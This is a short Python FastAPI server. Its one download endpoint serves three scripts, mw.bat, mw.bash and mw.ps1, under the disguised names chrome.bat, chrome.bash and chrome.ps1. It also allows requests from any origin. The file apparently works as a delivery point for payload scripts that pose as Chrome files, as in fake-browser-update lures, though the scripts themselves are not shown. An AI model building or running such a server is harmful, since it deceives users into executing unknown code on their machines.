from typing import Annotated
from enum import Enum
from fastapi import FastAPI, Path, HTTPException
from fastapi.responses import FileResponse
from pathlib import Path as PathLibPath
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class MWName(str, Enum):
    bat_man = "mw.bat"
    bash_man = "mw.bash"
    ps_one = "mw.ps1"

@app.get("/")
async def root():
    return {"message": "Welcome"}


@app.get("/download/{filename}")
async def download_file(filename: Annotated[MWName, Path(title="file to download")]):
    target_path = PathLibPath(f"./app/{filename.value}")
    print(str(target_path)) 

    if target_path.is_file():
        name_map = {
            MWName.bash_man: ("chrome.bash", "application/bash"),
            MWName.bat_man: ("chrome.bat", "application/bat"),
            MWName.ps_one: ("chrome.ps1", "application/ps1"),
        }
        download_name, media_type = name_map[filename]
        return FileResponse(path=target_path, filename=download_name, media_type=media_type)
    else:
        raise HTTPException(status_code=404, detail="File not found")
